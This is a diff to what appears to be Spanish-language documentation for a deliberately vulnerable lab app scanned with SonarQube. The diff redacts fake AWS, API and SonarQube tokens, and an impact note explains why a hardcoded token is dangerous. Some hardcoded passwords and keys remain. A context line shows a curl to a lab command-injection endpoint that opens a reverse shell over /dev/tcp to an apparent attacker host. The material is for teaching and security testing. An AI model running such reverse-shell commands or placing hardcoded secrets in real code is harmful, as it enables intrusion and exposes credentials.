@@ -967,8 +967,8 @@ curl "http://localhost:4000/api/admin/lab/cmd?cmd=bash%20-i%20>%26%20/dev/tcp/at
 // backend/src/controllers/legacyDebtController.js
 
 const MASTER_PASSWORD      = 'SuperAdmin2026!';
-const AWS_ACCESS_KEY_ID    = 'AKIAIOSFODNN7EXAMPLE';
-const AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
+const AWS_ACCESS_KEY_ID    = 'AKIA[REDACTED-FAKE-AWS-KEY]';
+const AWS_SECRET_ACCESS_KEY = '[REDACTED-FAKE-AWS-SECRET-KEY]';
 const PRIVATE_KEY          = '-----BEGIN PRIVATE KEY-----\n'
                            + 'MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALab\n'
                            + '-----END PRIVATE KEY-----';
@@ -983,7 +983,7 @@ const CARD_TEST_NUMBER     = '4111111111111111';    // ← Número de tarjeta Vi
 ```javascript
 // frontend/src/sonarDebt.js
 
-export const FRONTEND_API_SECRET  = 'sk_test_51N0tRealButLooksLikeASecret';
+export const FRONTEND_API_SECRET  = 'sk_test_[REDACTED-FAKE-KEY-LABORATORIO]';
 export const GOOGLE_MAPS_KEY      = 'AIzaSyA-FAKE-SONAR-DEMO-KEY-123456789';
 export const BASIC_AUTH_HEADER    = 'Basic YWRtaW46YWRtaW4xMjM=';  // admin:admin123 en Base64
 export const LEGACY_JWT           = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.signature';
@@ -1008,7 +1008,7 @@ services:
 ```properties
 sonar.projectKey=vulnerable-cartera
 sonar.sources=src
-sonar.token=sqp_51d6938a8e1668dee272c828763b548c25997995
+sonar.token=sqp_[REDACTED-SONAR-TOKEN-LAB]
 ```
 
 > **Impacto:** El token de SonarQube hardcodeado en el archivo de propiedades permite a cualquier persona con acceso al repositorio acceder a la instancia de SonarQube, consultar todos los informes de análisis (que incluyen vulnerabilidades) y potencialmente modificar configuraciones del proyecto.
